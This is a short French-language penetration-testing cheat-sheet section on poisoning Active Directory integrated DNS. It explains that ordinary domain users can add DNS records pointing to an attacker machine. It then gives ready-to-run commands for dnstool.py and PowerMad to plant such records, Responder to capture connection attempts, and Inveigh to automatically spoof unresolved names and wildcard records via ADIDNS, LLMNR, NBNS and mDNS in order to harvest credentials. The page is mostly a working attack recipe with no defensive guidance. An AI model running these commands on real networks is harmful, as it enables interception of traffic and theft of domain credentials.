### Poisoning

Par défaut, un utilisateur peut ajouter une entrée dans le serveur dns de l'AD et faire pointer ce sous domaine vers, par exemple, l'ip d'un poste attaquant. Il est ensuite possible d'utiliser un outil tel que responder pour éventuellement récupérer des tentatives de connexions (imaginons par exemple un script de monitoring sur les différentes entrées du domaine, un lecteur réseau qui n'est plus utilisé ou autre...).

Utilisation de dnstool (https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)

#### Ajouter un enregistrement DNS (depuis linux):

```bash
dnstool.py -u 'DOMAIN\user' -p 'password' --record 'sousDomaine' --action add --data $AttackerIP $DomainController
```

#### Depuis Windows:

```bash
Set-ADIDNSNodeAttribute -Node sousDomaine -Attribute DNSRecord -Value (New-DNSRecordArray -Data $ATTACKER_IP) -Verbose

# Activer/désactiver un node:
Enable-ADIDNSNode -Node *
Disable-ADIDNSNode -Node *
```

### Utilisation de responder:

```bash
sudo responder -I tun0 -d -D
```

Depuis Windows, il est possible d'automatiser le processus (Inveigh va checker si des appels DNS n'aboutissent à rien, si c'est le cas il va créer l'entrée DNS en question et la rediriger vers lui pour récupérer d'éventuelles informations):

```powershell
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts
```

